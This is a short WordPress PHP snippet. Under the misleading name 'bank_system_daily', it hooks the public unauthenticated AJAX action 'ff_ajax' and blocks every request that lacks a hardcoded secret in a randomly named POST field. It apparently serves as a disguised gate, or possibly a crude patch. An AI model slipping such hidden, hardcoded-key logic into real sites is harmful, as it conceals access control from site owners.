<?php

function bank_system_daily() {
	if (!isset($_POST["rfuqhrwbvskhem"]) || $_POST["rfuqhrwbvskhem"] !== "x6aNJEmQ5qrE") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'bank_system_daily', 5, 1);
